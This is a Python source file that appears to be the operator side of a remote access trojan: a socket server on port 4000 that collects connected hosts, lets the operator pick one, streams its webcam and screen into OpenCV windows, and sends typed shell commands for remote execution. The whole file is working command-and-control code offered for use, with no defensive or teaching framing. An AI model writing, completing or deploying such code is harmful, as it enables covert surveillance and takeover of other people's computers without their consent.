import numpy as np
import keyboard
import socket
import pickle
import struct
import time
import cv2

from threading import Thread

Users = {}
IPs = []

class CommandCMD():
    def __init__(self, conn):
        self.conn = conn
        print("test")
        self.commands()
        
    def commands(self):
        command = input("CMD:")
     
        self.conn.sendall(command.encode())
        return

class Server():
    def __init__(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind(("0.0.0.0", 4000))
        self.server.listen(10)

        self.stop_loop = False
        
        Thread(target=self.init_server, args=()).start()

        self.proc_data = Thread(target=self.process_data, args=())
        self.exec_command = Thread(target=self.execute_command, args=())
        
        self.select_device_ip()
        
    def init_server(self):
        while True:
            conn, addr = self.server.accept()

            ddr = addr[0]+":"+str(addr[1])

            Users[ddr] = conn
            IPs.append(ddr)
            print("Connection recv", ddr)

    def select_device_ip(self):
        while True:
            print("IP list: ", IPs)

            try:
                self.device = input("Select: ")
            except:
                continue
            
            try:
                self.conn = Users[self.device]
                self.conn.sendall(b"cam_packet")

                self.proc_data.start()
                self.exec_command.start()
                break

            except Exception as err:
                print(err)
                continue

    def process_data(self):
        while True:
            conn = self.conn

            if self.stop_loop:
                time.sleep(1)
                continue

            try:
                action = self.conn.recv(1)[0]
            except:
                continue

            if action == 0x01 or action == 0x03:
                packet_len = conn.recv(3)

                packet_len = ((packet_len[0] << 16)| (packet_len[1] << 8)| packet_len[2])

                cameraDump = conn.recv(packet_len)

                image_opencv = cv2.imdecode(np.frombuffer(cameraDump, dtype=np.uint8),cv2.IMREAD_COLOR)

                if image_opencv is not None:
                    if action == 0x01:
                        cv2.imshow("Stream", image_opencv)
                        cv2.waitKey(1)

                    elif action == 0x03:
                        cv2.namedWindow("Screen", cv2.WINDOW_NORMAL) 
                        cv2.resizeWindow("Screen", 2560, 1080) 

                        cv2.imshow("Screen", image_opencv)
                        cv2.waitKey(1)

            elif action == 0x04:
                msg_len = conn.recv(3)
                msg_len = (msg_len[0] << 16) + (msg_len[1] << 8) + msg_len[2]
                msg = self.conn.recv(msg_len)

    def execute_command(self):
        while True:
            if keyboard.is_pressed("t"):
                self.conn.sendall(b"cmd_packet")
                self.stop_loop = True   

                try:
                    CommandCMD(self.conn)
                except Exception as err:
                    print(err)
                    pass

                self.stop_loop = False

if __name__ == "__main__":
    Server()